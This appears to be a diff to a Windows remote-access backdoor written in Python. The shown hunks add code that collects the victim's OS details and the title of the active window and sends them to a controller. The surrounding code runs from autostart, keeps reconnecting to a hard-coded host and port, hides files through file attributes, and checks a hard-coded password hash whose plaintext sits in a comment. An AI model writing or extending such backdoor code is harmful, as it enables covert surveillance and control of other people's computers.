@@ -7,13 +7,14 @@ import os
 import subprocess
 import ctypes
 import sys
+import platform
 
 HOST = '127.0.0.1'
 PORT = 4434
 active = False
 data = ''
 passKey = r'1705a7f91b40320a19db18912b72148e' # key: paroli123
-
+unlocked = False
 
 # INIT Widnows DLL's
 Kernel32 = ctypes.windll.kernel32
@@ -74,23 +75,42 @@ def set_content_attribute(filepath):
     else:
         Kernel32.SetFileAttributesW(filepath, 2)
 
+def GetWindowTitle():
+    GetForegroundWindow = ctypes.windll.user32.GetForegroundWindow
+    GetWindowTextLength = ctypes.windll.user32.GetWindowTextLengthW
+    GetWindowText = ctypes.windll.user32.GetWindowTextW
+    HWND = GetForegroundWindow()
+    length = GetWindowTextLength(HWND)
+    buff = ctypes.create_unicode_buffer(length + 1)
+    GetWindowText(HWND, buff, length + 1)
+    return buff.value
+
+def iam():
+    global locked
+    data = {}
+    data['ostype'] = str(sys.platform)
+    data['os'] = str(platform.platform())
+    data['protection'] = str(unlocked)
+    data['activewindowtitle'] = str(GetWindowTitle())
+    return str(data)
+
 def fromAutostart():
     global active
     global passKey
-    passerror = False
+    global unlocked
     while True:
         try:
-            if not passerror:
+            if not unlocked:
                 try:
                     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     s.connect((HOST, PORT))
                 except:
                     s.close()
                     active = False
-                    time.sleep(10)
+                    time.sleep(5)
             data = Receive(s)
-            if data == 'whatisyouros':
-                Send(s, str(sys.platform))
+            if data == 'whoareyou':
+                Send(s, iam())
             if data == passKey:
                 active = True
                 Send(s, 'iamactive')
@@ -135,11 +155,11 @@ def fromAutostart():
                 time.sleep(3)
             else:
                 Send(s, 'Access Denied')
-                passerror = True
+                unlocked = True
         except socket.error:
                 s.close()
                 active = False
-                passerror = False
+                unlocked = False
                 time.sleep(10)
 
 
